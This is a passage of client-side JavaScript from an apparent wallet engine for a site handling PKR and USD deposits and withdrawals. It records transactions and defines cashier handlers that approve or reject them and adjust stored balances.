                date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                timestamp: new Date().toISOString()
            };

            if (!this.state.transactions) this.state.transactions = [];
            this.state.transactions.unshift(txn);
            this.saveState();

            try {
                localStorage.setItem('bwn_latest_tx_broadcast', JSON.stringify({
                    id: txnId,
                    type: 'withdraw',
                    amount: amountPKR,
                    amount_pkr: amountPKR,
                    amount_usd: amountUSD,
                    method: methodName,
                    sender_account: accountNumber,
                    user_id: accountTitle || 'Player',
                    trx_id: txnId,
                    timestamp: Date.now()
                }));
            } catch(e) {}

            if (window.core && window.core.updateAllBalances) {
                window.core.updateAllBalances();
            }

            resolve(txn);
        });
    }

    // Cashier Approval Handlers
    approveDeposit(txnId) {
        const txn = (this.state.transactions || []).find(t => t.id === txnId);
        if (!txn || txn.status === 'Approved') return false;

        txn.status = 'Approved';
        const usdToAdd = txn.amountUSD || (txn.amountPKR ? (txn.amountPKR / this.exchangeRate) : 0);
        this.state.balanceUSD += usdToAdd;
        this.state.balancePKR += (usdToAdd * this.exchangeRate);
        this.saveState();
        return true;
    }

    rejectDeposit(txnId, reason = 'Verification Failed') {
        const txn = (this.state.transactions || []).find(t => t.id === txnId);
        if (!txn) return false;
        txn.status = 'Rejected';
        txn.rejectReason = reason;
        this.saveState();
        return true;
    }

    approveWithdraw(txnId) {
        const txn = (this.state.transactions || []).find(t => t.id === txnId);
        if (!txn || txn.status === 'Approved') return false;
        txn.status = 'Approved';
        this.saveState();
        return true;
    }

    rejectWithdraw(txnId, reason = 'Compliance Review') {
        const txn = (this.state.transactions || []).find(t => t.id === txnId);
        if (!txn) return false;
        txn.status = 'Rejected';
        txn.rejectReason = reason;

        // Refund deducted funds back to balance
        const refundUSD = txn.amountUSD || (txn.amountPKR ? (txn.amountPKR / this.exchangeRate) : 0);
        this.state.balanceUSD += refundUSD;
        this.state.balancePKR += (refundUSD * this.exchangeRate);
        this.saveState();
        return true;
    }
}

window.wallet = new WalletEngine();
window.walletEngine = window.wallet;
